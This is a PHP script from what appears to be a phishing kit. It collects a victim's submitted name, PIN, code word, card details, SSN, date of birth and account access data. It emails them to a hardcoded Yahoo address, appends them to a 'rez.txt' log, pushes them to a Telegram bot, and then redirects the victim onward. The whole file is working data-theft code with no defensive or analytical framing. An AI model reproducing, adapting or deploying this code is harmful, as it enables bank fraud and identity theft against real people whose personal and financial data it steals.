<?php
ini_set("output_buffering",4096);
session_start();
ob_start();

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$zabi = getenv("REMOTE_ADDR");
include('email.php');

$fn = $_POST['fn'];
$pin = $_POST['pin'];
$cw = $_POST['cw'];
$cc = $_POST['cc'];
$exp = $_POST['exp'];
$csc = $_POST['csc'];
$phone = $_POST['phone'];
$acc = $_POST['acc'];
$ssn = $_POST['ssn'];
$dob = $_POST['dob'];
$em = $_POST['em'];
$emp = $_POST['emp'];
$message .="
Full Name : ".$fn."
Pin : ".$pin."
Code Word : ".$cw."
phone : ".$phone."
SSN : ".$ssn."
Dob MM/DD/YYYY : ".$dob."
access : ".$acc."
====================== 	PC-INFO ====================||
Date / time	    : $date
Client IP         : http://www.geoiptool.com/?IP=$ip
=========||waelrakha161@yahoo.com |=====================||\n";
$send="waelrakha161@yahoo.com";
$subject = "nv RZ | $ip";
mail($send,$subject,$message);
@fclose(@fwrite(@fopen("rez.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);
    include ('telegram.php');
    if($telegram == 'on')
    {
        $i=0;
        while ($i != $sendnum){
    
        
        $send = ['chat_id'=>$chatid,'text'=>$message];
        $web_telegram = "https://api.telegram.org/{$token}";
        $ch = curl_init($web_telegram . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        $i = $i+1;
    }
    }
die("<script>location.href = 'pr.html?$host'</script>");
?>

